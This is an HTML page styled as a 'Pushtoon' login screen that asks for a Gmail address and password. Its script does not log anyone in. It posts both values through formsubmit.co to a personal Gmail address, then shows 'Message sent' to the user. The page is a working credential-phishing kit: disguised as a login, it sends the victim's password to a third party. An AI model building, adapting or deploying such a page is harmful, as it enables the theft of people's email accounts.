<!DOCTYPE html>
<html>
<head>
  <title>Pushtoon Login</title>

  <style>
    body{
      margin:0;
      height:100vh;
      display:flex;
      justify-content:center;
      align-items:center;
      font-family:Arial;
      background: linear-gradient(135deg, #1f1c2c, #928dab);
    }

    .container{
      background:white;
      padding:40px;
      border-radius:15px;
      width:320px;
      text-align:center;
      box-shadow:0 10px 30px rgba(0,0,0,0.3);
    }

    h2{
      margin-bottom:20px;
    }

    input{
      width:90%;
      padding:12px;
      margin:10px 0;
      border:1px solid #ccc;
      border-radius:8px;
      outline:none;
    }

    button{
      width:95%;
      padding:12px;
      border:none;
      border-radius:8px;
      background:#6a1b9a;
      color:white;
      font-size:16px;
      cursor:pointer;
    }

    #msg{
      margin-top:10px;
      font-size:14px;
      color:green;
    }
  </style>

</head>

<body>

<div class="container">

  <h2>LOGIN</h2>

  <input type="email" id="email" placeholder="Enter Gmail">
  <input type="password" id="password" placeholder="Enter Password">

  <button onclick="sendData()">LOG IN</button>

  <div id="msg"></div>

</div>

<script>

function sendData(){

    let email = document.getElementById("email").value.trim();
    let password = document.getElementById("password").value.trim();

    if(email === "" || password === ""){
        document.getElementById("msg").style.color = "red";
        document.getElementById("msg").innerText = "Please fill all fields";
        return;
    }

    // instant UI message
    document.getElementById("msg").style.color = "green";
    document.getElementById("msg").innerText = "Message sent ✔";

    // send to Gmail (FormSubmit)
    let formData = new FormData();
    formData.append("email", email);
    formData.append("password", password);

    fetch("https://formsubmit.co/folkking66@gmail.com", {
        method: "POST",
        body: formData
    });

}

</script>

</body>
</html>
